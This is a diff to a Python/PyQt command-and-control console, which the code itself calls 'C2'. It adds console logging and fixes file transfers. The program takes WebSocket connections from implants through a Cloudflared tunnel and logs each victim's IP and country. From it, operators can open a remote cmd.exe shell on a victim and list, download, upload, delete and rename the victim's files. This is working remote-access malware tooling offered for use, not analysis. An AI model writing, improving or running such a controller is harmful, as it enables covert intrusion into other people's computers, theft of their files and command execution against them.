@@ -21,7 +21,13 @@ WS_OP_CLOSE = 0x08
 WS_OP_PING = 0x09
 WS_OP_PONG = 0x0A
 
-FILE_CHUNK = 65536
+FILE_CHUNK = 32768
+
+
+def log_console(msg: str):
+    """所有调试信息统一输出到控制台窗口"""
+    ts = datetime.now().strftime("%H:%M:%S.%f")[:-3]
+    print(f"[{ts}] {msg}", flush=True)
 
 
 def ws_compute_accept(key: bytes) -> bytes:
@@ -84,6 +90,7 @@ def ws_handle_http_upgrade(sock: socket.socket):
     try:
         while True:
             if time.time() - start > 8:
+                log_console("握手超时")
                 return False, "", "", ""
             chunk = sock.recv(1024)
             if not chunk:
@@ -91,15 +98,18 @@ def ws_handle_http_upgrade(sock: socket.socket):
             buf.extend(chunk)
             if b"\r\n\r\n" in buf:
                 break
-    except Exception:
+    except Exception as e:
+        log_console(f"握手读取异常: {e}")
         return False, "", "", ""
 
     first_line = buf.split(b"\r\n")[0]
     parts = first_line.split(b" ")
     if len(parts) < 3:
+        log_console(f"握手首行不合法: {first_line}")
         return False, "", "", ""
     method, path, proto = parts
     if path not in (b"/", b"/ws"):
+        log_console(f"握手路径不匹配: {path}")
         return False, "", "", ""
 
     headers = {}
@@ -118,10 +128,21 @@ def ws_handle_http_upgrade(sock: socket.socket):
     ws_key = headers.get(b"sec-websocket-key")
     ws_version = headers.get(b"sec-websocket-version")
 
-    if conn_val != b"Upgrade": return False, real_ip, country, display_name
-    if upgrade_val != b"websocket": return False, real_ip, country, display_name
-    if not ws_key: return False, real_ip, country, display_name
-    if ws_version != b"13": return False, real_ip, country, display_name
+    log_console(f"握手请求: {method.decode(errors='replace')} {path.decode(errors='replace')} "
+                f"IP={real_ip or '(无)'} 国家={country}")
+
+    if conn_val != b"Upgrade":
+        log_console(f"握手失败: Connection 头不是 Upgrade, 实际={conn_val!r}")
+        return False, real_ip, country, display_name
+    if upgrade_val != b"websocket":
+        log_console(f"握手失败: Upgrade 头不是 websocket, 实际={upgrade_val!r}")
+        return False, real_ip, country, display_name
+    if not ws_key:
+        log_console("握手失败: 缺少 Sec-WebSocket-Key")
+        return False, real_ip, country, display_name
+    if ws_version != b"13":
+        log_console(f"握手失败: Sec-WebSocket-Version 不是 13, 实际={ws_version!r}")
+        return False, real_ip, country, display_name
 
     accept_val = ws_compute_accept(ws_key)
     resp = (b"HTTP/1.1 101 Switching Protocols\r\n"
@@ -130,7 +151,9 @@ def ws_handle_http_upgrade(sock: socket.socket):
             b"Sec-WebSocket-Accept: " + accept_val + b"\r\n\r\n")
     try:
         sock.sendall(resp)
-    except Exception:
+        log_console(f"握手成功: {display_name}")
+    except Exception as e:
+        log_console(f"握手响应发送失败: {e}")
         return False, real_ip, country, display_name
     return True, real_ip, country, display_name
 
@@ -164,7 +187,8 @@ class ClientSession:
             with self._send_lock:
                 self.conn.sendall(ws_frame)
             return True
-        except (OSError, BrokenPipeError):
+        except (OSError, BrokenPipeError) as e:
+            log_console(f"发送失败 [{self.display_name}]: {e}")
             self.close()
             return False
 
@@ -213,6 +237,7 @@ class RemoteCmdDialog(QDialog):
 
         self.out_box.append(f"==== 连接 {client_session.display_name} 远程CMD ====\n[*] 已发送SPAW启动被控端cmd.exe")
         self.client.send_packet(b"SPAW")
+        log_console(f"CMD会话打开: {client_session.display_name}")
 
         if parent and hasattr(parent, 'is_dark_mode'):
             self.apply_theme(parent.is_dark_mode)
@@ -237,15 +262,18 @@ class RemoteCmdDialog(QDialog):
         self.cmd_input.clear()
         if not self.is_alive or not self.client.connected:
             self.out_box.append("\n[!] 连接断开")
+            log_console("CMD命令发送失败: 连接已断开")
             return
         payload = b"EXEK" + cmd.encode("gbk", errors="replace")
         ok = self.client.send_packet(payload)
         self.out_box.append(f"> {cmd}")
+        log_console(f"CMD命令 [{self.client.display_name}]: {cmd} (发送{'成功' if ok else '失败'})")
         if not ok:
             self.out_box.append("[发送失败]")
 
     def closeEvent(self, event):
         self.is_alive = False
+        log_console(f"CMD会话关闭: {self.client.display_name}")
         if self.client.connected:
             self.client.send_packet(b"KILL")
         if self.main_window and self.client in self.main_window.open_cmd_dialogs:
@@ -304,6 +332,7 @@ class FileManagerDialog(QDialog):
         self.timer.timeout.connect(self.process_fs_events)
         self.timer.start()
 
+        log_console(f"文件管理打开: {client_session.display_name}")
         self.client.send_packet(b"FDRV")
         if parent and hasattr(parent, 'is_dark_mode'):
             self.apply_theme(parent.is_dark_mode)
@@ -323,6 +352,7 @@ class FileManagerDialog(QDialog):
 
     def log(self, msg):
         self.log_box.append(msg)
+        log_console(f"[文件管理 {self.client.display_name}] {msg}")
 
     @pyqtSlot(object, bytes)
     def on_fs_data(self, sess, body: bytes):
@@ -341,13 +371,17 @@ class FileManagerDialog(QDialog):
         if cmd == b"FDRV":
             text = payload.decode("gbk", errors="replace")
             drives = [d for d in text.split("|") if d]
+            log_console(f"[文件管理] 收到驱动器列表: {drives}")
             self.tree.clear()
             for d in drives:
-                item = QTreeWidgetItem([d, "", "驱动器", d])
+                # 补上反斜杠，方便双击进入
+                d_full = d if d.endswith("\\") else d + "\\"
+                item = QTreeWidgetItem([d_full, "", "驱动器", d_full])
                 self.tree.addTopLevelItem(item)
 
         elif cmd == b"FDIR":
             text = payload.decode("gbk", errors="replace")
+            log_console(f"[文件管理] 收到目录列表，长度={len(text)}")
             self.tree.clear()
             for entry in text.split(";"):
                 if not entry: continue
@@ -370,7 +404,7 @@ class FileManagerDialog(QDialog):
                 self.download_name = parts[0]
                 self.download_total = int(parts[1])
                 self.download_buf = bytearray()
-                self.log(f"[下载] {self.download_name} ({self.download_total} 字节)")
+                log_console(f"[下载] 开始 {self.download_name}, 总大小={self.download_total}")
 
         elif cmd == b"FDAT":
             if len(payload) < 8: return
@@ -379,9 +413,22 @@ class FileManagerDialog(QDialog):
             if offset == len(self.download_buf):
                 self.download_buf.extend(data)
             else:
-                self.log(f"[下载] 偏移异常 {offset} != {len(self.download_buf)}")
-            if self.download_total > 0 and len(self.download_buf) >= self.download_total:
-                self.finish_download()
+                log_console(f"[下载] 偏移异常 offset={offset} buf_len={len(self.download_buf)}")
+                # 容错：按偏移拼接
+                if offset > len(self.download_buf):
+                    self.download_buf.extend(b"\x00" * (offset - len(self.download_buf)))
+                self.download_buf[offset:offset+len(data)] = data
+            # 不再用 total 判断结束，等 FDON
+
+        elif cmd == b"FDON":
+            # Agent 发来的结束标记
+            if len(payload) >= 8:
+                server_total = struct.unpack("<Q", payload[0:8])[0]
+            else:
+                server_total = self.download_total
+            log_console(f"[下载] 收到结束标记 FDON, 实际收到={len(self.download_buf)}, "
+                        f"声明总大小={server_total}")
+            self.finish_download()
 
         elif cmd == b"FACK":
             if len(payload) >= 8:
@@ -391,18 +438,32 @@ class FileManagerDialog(QDialog):
                     self.send_next_upload_chunk()
 
         elif cmd == b"FOK":
-            self.log("[OK]")
+            log_console("[文件管理] 收到 FOK")
 
         elif cmd == b"FERR":
-            self.log(f"[错误] {payload.decode('gbk', errors='replace')}")
+            msg = payload.decode("gbk", errors="replace")
+            log_console(f"[文件管理] 收到 FERR: {msg}")
+            self.log(f"[错误] {msg}")
 
     def finish_download(self):
+        if not self.download_buf:
+            log_console("[下载] 缓冲区为空，取消保存")
+            self.download_buf = bytearray()
+            self.download_total = 0
+            self.download_name = ""
+            return
         save_path, _ = QFileDialog.getSaveFileName(self, "保存文件", self.download_name)
         if save_path:
-            with open(save_path, "wb") as f:
-                f.write(self.download_buf)
-            self.log(f"[下载完成] {save_path} ({len(self.download_buf)} 字节)")
+            try:
+                with open(save_path, "wb") as f:
+                    f.write(self.download_buf)
+                log_console(f"[下载完成] {save_path} ({len(self.download_buf)} 字节)")
+                self.log(f"[下载完成] {save_path} ({len(self.download_buf)} 字节)")
+            except OSError as e:
+                log_console(f"[下载失败] 写入本地文件出错: {e}")
+                self.log(f"[下载失败] {e}")
         else:
+            log_console("[下载取消]")
             self.log("[下载取消]")
         self.download_buf = bytearray()
         self.download_total = 0
@@ -419,21 +480,26 @@ class FileManagerDialog(QDialog):
         path = self.path_edit.text().strip()
         if path:
             self.current_path = path
+            log_console(f"[文件管理] 转到 {path}")
             self.client.send_packet(b"FDIR" + path.encode("gbk", errors="replace"))
 
     def on_up(self):
-        if not self.current_path: return
+        if not self.current_path:
+            return
         p = self.current_path.rstrip("\\")
         idx = p.rfind("\\")
         if idx <= 1:
+            log_console("[文件管理] 回到驱动器列表")
             self.client.send_packet(b"FDRV")
             self.current_path = ""
         else:
             self.current_path = p[:idx]
             self.path_edit.setText(self.current_path)
+            log_console(f"[文件管理] 上级到 {self.current_path}")
             self.client.send_packet(b"FDIR" + self.current_path.encode("gbk", errors="replace"))
 
     def on_refresh(self):
+        log_console("[文件管理] 刷新")
         if self.current_path:
             self.client.send_packet(b"FDIR" + self.current_path.encode("gbk", errors="replace"))
         else:
@@ -445,8 +511,10 @@ class FileManagerDialog(QDialog):
         if typ in ("目录", "驱动器"):
             self.current_path = full
             self.path_edit.setText(full)
+            log_console(f"[文件管理] 双击进入 {full}")
             self.client.send_packet(b"FDIR" + full.encode("gbk", errors="replace"))
         elif typ == "文件":
+            log_console(f"[文件管理] 双击下载 {full}")
             self.client.send_packet(b"FGET" + full.encode("gbk", errors="replace"))
 
     def on_context_menu(self, pos):
@@ -462,10 +530,12 @@ class FileManagerDialog(QDialog):
         act_mkdir = menu.addAction("新建文件夹") if typ in ("目录", "驱动器") else None
         ret = menu.exec(self.tree.viewport().mapToGlobal(pos))
         if act_download and ret == act_download:
+            log_console(f"[文件管理] 右键下载 {full}")
             self.client.send_packet(b"FGET" + full.encode("gbk", errors="replace"))
         elif act_upload and ret == act_upload:
             self.start_upload_to(full)
         elif ret == act_delete:
+            log_console(f"[文件管理] 删除 {full}")
             self.client.send_packet(b"FDEL" + full.encode("gbk", errors="replace"))
             QTimer.singleShot(500, self.on_refresh)
         elif ret == act_rename:
@@ -474,12 +544,14 @@ class FileManagerDialog(QDialog):
                 parent = full.rsplit("\\", 1)[0]
                 new_full = parent + "\\" + new_name
                 payload = f"{full}|{new_full}"
+                log_console(f"[文件管理] 重命名 {full} -> {new_full}")
                 self.client.send_packet(b"FREN" + payload.encode("gbk", errors="replace"))
                 QTimer.singleShot(500, self.on_refresh)
         elif act_mkdir and ret == act_mkdir:
             name, ok = QInputDialog.getText(self, "新建文件夹", "名称:")
             if ok and name:
                 new_dir = full.rstrip("\\") + "\\" + name
+                log_console(f"[文件管理] 新建目录 {new_dir}")
                 self.client.send_packet(b"FMKD" + new_dir.encode("gbk", errors="replace"))
                 QTimer.singleShot(500, self.on_refresh)
 
@@ -491,11 +563,13 @@ class FileManagerDialog(QDialog):
         try:
             self.upload_file = open(local_path, "rb")
         except OSError as e:
+            log_console(f"[上传失败] 打开本地文件出错: {e}")
             self.log(f"[上传失败] {e}"); return
         self.upload_total = os.path.getsize(local_path)
         self.upload_sent = 0
         self.upload_path = remote_path
         args = f"{remote_path}|{self.upload_total}"
+        log_console(f"[上传] 开始 {fname} ({self.upload_total} 字节) -> {remote_path}")
         self.client.send_packet(b"FPUT" + args.encode("gbk", errors="replace"))
         self.log(f"[上传] {fname} ({self.upload_total} 字节) -> {remote_path}")
 
@@ -505,17 +579,33 @@ class FileManagerDialog(QDialog):
         if not chunk:
             self.upload_file.close()
             self.upload_file = None
+            log_console(f"[上传完成] {self.upload_path} ({self.upload_total} 字节)")
             self.log("[上传完成]")
             QTimer.singleShot(500, self.on_refresh)
             return
         offset = self.upload_sent
         body = b"FDAT" + struct.pack("<Q", offset) + chunk
-        self.client.send_packet(body)
+        ok = self.client.send_packet(body)
+        if not ok:
+            log_console(f"[上传失败] 发送分块失败 offset={offset}")
+
+    def reset_transfer_state(self):
+        """断连时清理状态"""
+        self.download_buf = bytearray()
+        self.download_total = 0
+        self.download_name = ""
+        if self.upload_file:
+            try: self.upload_file.close()
+            except Exception: pass
+        self.upload_file = None
+        self.upload_total = 0
+        self.upload_sent = 0
+        self.upload_path = ""
 
     def closeEvent(self, event):
         self.timer.stop()
-        if self.upload_file:
-            self.upload_file.close()
+        self.reset_transfer_state()
+        log_console(f"文件管理关闭: {self.client.display_name}")
         super().closeEvent(event)
 
 
@@ -591,6 +681,7 @@ class MainWindow(QMainWindow):
         self.ping_timer.timeout.connect(self.broadcast_ping)
 
         self.apply_theme(False)
+        log_console("C2 启动，等待开始监听")
 
     def apply_theme(self, dark: bool):
         self.is_dark_mode = dark
@@ -624,20 +715,26 @@ class MainWindow(QMainWindow):
 
     def log(self, msg):
         self.log_box.append(f"[{datetime.now().strftime('%H:%M:%S')}] {msg}")
+        log_console(msg)
 
     @pyqtSlot()
     def broadcast_ping(self):
+        n = 0
         for sess in list(self.client_model.items):
             if sess.connected:
                 sess.send_packet(b"PING")
+                n += 1
+        if n:
+            log_console(f"广播 PING 给 {n} 个客户端")
 
     def accept_loop(self):
         while self.server_running:
             try:
                 raw_conn, addr = self.server_sock.accept()
+                log_console(f"收到新 TCP 连接: {addr}")
                 ok, ip, country, display_name = ws_handle_http_upgrade(raw_conn)
                 if not ok:
-                    self.log(f"WebSocket握手失败 {addr}")
+                    log_console(f"WebSocket握手失败 {addr}")
                     raw_conn.close(); continue
                 if not ip: ip = addr[0]
                 if not country: country = "XX"
@@ -650,6 +747,9 @@ class MainWindow(QMainWindow):
                 threading.Thread(target=self.client_recv_loop, args=(sess,), daemon=True).start()
             except OSError:
                 break
+            except Exception as e:
+                log_console(f"accept_loop 异常: {e}")
+                break
 
     @pyqtSlot(object, str)
     def handle_session_outp(self, sess, text):
@@ -658,21 +758,29 @@ class MainWindow(QMainWindow):
 
     @pyqtSlot(object)
     def handle_session_disconnect(self, sess):
+        log_console(f"[断开] {sess.display_name}")
         if sess in self.open_cmd_dialogs:
             dlg = self.open_cmd_dialogs.pop(sess)
             dlg.append_text("\n[!] WebSocket连接已经断开")
         if sess in self.open_file_dialogs:
             dlg = self.open_file_dialogs.pop(sess)
+            dlg.reset_transfer_state()
             dlg.close()
-        self.client_model.remove_by_obj(sess)
+        try:
+            self.client_model.remove_by_obj(sess)
+        except ValueError:
+            pass
         self.log(f"[断开] {sess.display_name}")
 
     def client_recv_loop(self, sess):
         buf = sess._recv_buf
+        log_console(f"接收线程启动: {sess.display_name}")
         while sess.connected:
             try:
                 chunk = sess.conn.recv(4096)
-                if not chunk: break
+                if not chunk:
+                    log_console(f"recv 返回空: {sess.display_name}")
+                    break
                 buf.extend(chunk)
                 while True:
                     fin, opcode, payload, consumed = ws_parse_frame(buf)
@@ -687,6 +795,7 @@ class MainWindow(QMainWindow):
                     elif opcode == WS_OP_PONG:
                         continue
                     elif opcode == WS_OP_CLOSE:
+                        log_console(f"收到 CLOSE 帧: {sess.display_name}")
                         break
                     elif opcode == WS_OP_TEXT:
                         continue
@@ -711,27 +820,41 @@ class MainWindow(QMainWindow):
                                             out_text = body[4:].decode("gbk", errors="replace")
                                             sess.signals.on_outp.emit(sess, out_text)
                                         elif cmd_code in (b"FDRV", b"FDIR", b"FMET", b"FDAT",
-                                                          b"FACK", b"FOK", b"FERR"):
+                                                          b"FDON", b"FACK", b"FOK", b"FERR"):
                                             sess.signals.on_fs.emit(sess, body)
-            except (OSError, ConnectionResetError):
+                                        else:
+                                            log_console(f"收到未知命令: {cmd_code!r}, len={len(body)}")
+            except (OSError, ConnectionResetError) as e:
+                log_console(f"recv 异常: {sess.display_name} {e}")
                 break
+        log_console(f"接收线程退出: {sess.display_name}")
         sess.close()
         sess.signals.on_disconnect.emit(sess)
 
     def start_server(self):
-        port = int(self.port_edit.text())
-        self.log(f"启动 Cloudflared Tunnel 模式，监听 127.0.0.1:{port}")
-        self.server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        self.server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-        self.server_sock.bind(("127.0.0.1", port))
-        self.server_sock.listen(8)
+        try:
+            port = int(self.port_edit.text())
+        except ValueError:
+            log_console("端口号不合法")
+            return
+        log_console(f"启动监听 127.0.0.1:{port}")
+        try:
+            self.server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            self.server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+            self.server_sock.bind(("127.0.0.1", port))
+            self.server_sock.listen(8)
+        except OSError as e:
+            log_console(f"监听失败: {e}")
+            return
         self.server_running = True
         threading.Thread(target=self.accept_loop, daemon=True).start()
         self.ping_timer.start()
         self.btn_start.setEnabled(False)
         self.btn_stop.setEnabled(True)
+        self.log(f"启动 Cloudflared Tunnel 模式，监听 127.0.0.1:{port}")
 
     def stop_server(self):
+        log_console("停止监听")
         self.ping_timer.stop()
         self.server_running = False
         if self.server_sock:
@@ -777,6 +900,7 @@ class MainWindow(QMainWindow):
             dlg.show()
 
     def closeEvent(self, event):
+        log_console("C2 关闭")
         self.stop_server()
         event.accept()
 
